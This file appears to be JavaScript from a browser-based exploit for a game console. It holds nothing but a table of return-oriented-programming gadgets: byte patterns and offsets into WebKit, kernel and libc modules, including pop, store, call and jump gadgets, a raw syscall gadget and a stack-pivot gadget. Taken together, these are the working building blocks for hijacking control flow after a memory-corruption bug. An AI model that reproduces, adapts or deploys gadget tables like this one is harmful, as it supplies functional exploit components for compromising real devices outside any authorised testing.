var vtable 				= 0;
var libKernel 			= 1;
var libScelibCInternal 	= 2;
var libSceWebKit2 		= 14;

gadgets = {
	"pop rax": 	new gadget([0x58], 					libSceWebKit2, 0x1c6ab),
	"pop rcx": 	new gadget([0x59], 					libSceWebKit2, 0x3ca71b),
	"pop rdx": 	new gadget([0x5a, 0xff, 0xc5], 		libSceWebKit2, 0x1afa),
	"pop rsi": 	new gadget([0x5e], 					libSceWebKit2, 0xb9ebb),
	"pop rdi": 	new gadget([0x5f], 					libSceWebKit2, 0x113991),
	"pop r8": 	new gadget([0x41, 0x58], 			libSceWebKit2, 0x1c6aa),
	"pop r9": 	new gadget([0x43, 0x59], 			libSceWebKit2, 0xee0a8f),
	"pop rbp": 	new gadget([0x5d], 					libSceWebKit2, 0x2177),
	"pop rsp": 	new gadget([0xf3, 0x5c], 			libSceWebKit2, 0x376850),

	"pop rcx; pop rcx": 		new gadget([], 		vtable, -0x5e970c),

	"mov r10, rcx and syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], 				libKernel, 		0x4b7),
	"mov [rax+0x1e8], rdx": 	new gadget([0x48, 0x89, 0x90, 0xe8, 0x01, 0x00, 0x00], 	libKernel, 		0x2032),

	"mov [rax+0x8], rsi": 		new gadget([0x48, 0x89, 0x70, 0x08], 					libSceWebKit2, 	0x5af574),
	"mov [rax], rcx": 			new gadget([0x48, 0x89, 0x08], 							libSceWebKit2, 	0x1129eee),
	"mov [rax], rsi": 			new gadget([0x48, 0x89, 0x30], 							libSceWebKit2, 	0x3d7a87),

	"mov [rcx], rax": 			new gadget([0x48, 0x89, 0x01], 							libSceWebKit2, 	0x225814),
	"mov [rcx], rdx": 			new gadget([0x48, 0x89, 0x11], 							libSceWebKit2,  0xbde080),
	
	"mov [rdx], rcx": 			new gadget([0x48, 0x89, 0x0a], 							libSceWebKit2, 	0x40c889),
	"mov [rdx], rsi": 			new gadget([0x48, 0x89, 0x32], 							libSceWebKit2, 	0xf64a0f),
	
	"mov [rsi+0x18], rax": 		new gadget([0x48, 0x89, 0x46, 0x18], 					libSceWebKit2, 	0x681f7),
	"mov [rsi+0x8], r8": 		new gadget([0x4c, 0x89, 0x46, 0x08], 					libSceWebKit2, 	0x25b67a),
	"mov [rsi], rcx": 			new gadget([0x48, 0x89, 0x0e], 							libSceWebKit2, 	0x12390),
	
	"mov [rdi], rax": 			new gadget([0x48, 0x89, 0x07], 							libSceWebKit2, 	0x11fc37),
	"mov [rdi+0x80], rdx": 		new gadget([0x48, 0x89, 0x97, 0x80, 0x00, 0x00, 0x00], 	libSceWebKit2, 	0x1153d24),
	"mov [rdi+0x80], rsi": 		new gadget([0x48, 0x89, 0xb7, 0x80, 0x00, 0x00, 0x00], 	libSceWebKit2, 	0x3dc290),
	"mov [rdi+0x20], rdx": 		new gadget([0x48, 0x89, 0x57, 0x20], 					libSceWebKit2, 	0xb610b),
	
	"mov rdi, [rdi+0x48]": 		new gadget([0x48, 0x8b, 0x7f, 0x48], 					libScelibCInternal, 0x8e982),

	"mov rax, [rdi]": 			new gadget([0x48, 0x8b, 0x07], 							libSceWebKit2, 	0xA0450),
	"mov rax, [rdi+0x18]": 		new gadget([0x48, 0x8b, 0x47, 0x18], 					libSceWebKit2, 	0x131000),
	
	"mov rdx, [rdi+0x8]": 		new gadget([0x48, 0x8b, 0x57, 0x08], 					libScelibCInternal, 	0x6973),
	"mov rax, rdi": 			new gadget([0x48, 0x89, 0xf8], 							libScelibCInternal, 	0x9480),
	"mov rax, rsi": 			new gadget([0x48, 0x89, 0xf0], 							libScelibCInternal, 	0xC3B4),
	"mov rax, r8": 				new gadget([0x4c, 0x89, 0xc0], 							libScelibCInternal, 	0x70738),
	"mov rdx, rdi": 			new gadget([0x48, 0x89, 0xfa], 							libScelibCInternal, 	0x8A7F),
	
	"call rax": new gadget([], libKernel, 			0x48),
	"call rbx": new gadget([], libScelibCInternal, 	0x9C50),
	"call rcx": new gadget([], libScelibCInternal, 	0x2F05),
	"call rdx": new gadget([], libScelibCInternal, 	0x9D5C9),
	"call rsi": new gadget([], libScelibCInternal, 	0x9D7D),
	
	"jmp rax":  new gadget([], libScelibCInternal, 	0x92),
	"jmp rbx":  new gadget([], libScelibCInternal, 	0x222F5),
	"jmp rcx":  new gadget([], libScelibCInternal, 	0xB7CC),
	"jmp rdx":  new gadget([], libScelibCInternal, 	0xB81C),

	"syscall": 	new gadget([], vtable, 				-0x3dc1a6),
	"xchg rax, rsp; dec dword ptr [rax - 0x77": 	new gadget([], 		vtable, 	-0x18a353f),
	"mov rax, qword ptr [rax]": 					new gadget([], 		vtable,		-0x238e98d),

	"ret": 		new gadget([], libSceWebKit2, 		0x62)
};